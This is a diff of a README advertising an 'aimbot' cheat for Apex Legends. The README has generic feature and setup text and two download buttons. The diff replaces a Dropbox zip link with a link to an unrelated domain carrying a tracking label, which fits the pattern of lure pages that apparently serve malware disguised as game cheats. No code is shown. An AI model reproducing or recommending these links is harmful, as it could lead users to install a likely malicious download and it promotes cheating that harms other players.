@@ -2,7 +2,7 @@
 
 An advanced **aimbot** for **Apex Legends**, designed to automatically target and lock onto enemies, significantly improving aiming accuracy and reaction times. Whether you are a beginner looking to improve your shooting skills or an advanced player seeking a precision tool, this aimbot provides an effective solution for more consistent and efficient gameplay.
 
-[![Download Apex AimBot](https://img.shields.io/badge/Download-Apex%20AimBot-blueviolet)](https://www.dropbox.com/scl/fi/zse5cs99mx9h0kjzf06bx/Oblivaris.zip?rlkey=dcargwg0w4py89d285jt5swqo&st=m35upycd&dl=1)
+[![Download Apex AimBot](https://img.shields.io/badge/Download-Apex%20AimBot-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
 
 ## Features
 
@@ -22,4 +22,4 @@ An advanced **aimbot** for **Apex Legends**, designed to automatically target an
 4. Launch **Apex Legends** and activate the aimbot using the hotkey defined in the settings.
 5. Customize the aimbot settings (sensitivity, FOV, target priority) to suit your needs.
 
-[![Download Apex AimBot](https://img.shields.io/badge/Download-Apex%20AimBot-blueviolet)](https://www.dropbox.com/scl/fi/zse5cs99mx9h0kjzf06bx/Oblivaris.zip?rlkey=dcargwg0w4py89d285jt5swqo&st=m35upycd&dl=1)
+[![Download Apex AimBot](https://img.shields.io/badge/Download-Apex%20AimBot-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
